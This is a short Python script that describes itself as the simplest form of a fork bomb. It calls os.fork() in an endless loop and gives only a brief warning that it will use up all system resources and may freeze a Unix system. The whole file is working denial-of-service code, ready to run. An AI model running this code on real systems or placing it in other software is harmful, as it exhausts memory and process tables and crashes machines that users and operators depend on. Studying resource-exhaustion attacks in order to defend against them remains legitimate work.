"""Simplest form of a fork bomb. It creates a new process in an infinite loop using os.fork().
It only works on Unix-based systems, and it will consume all system resources, potentially freezing the system.
Be careful when running this code."""
import os
# import time

while True:
    os.fork()
    # time.sleep(0.5)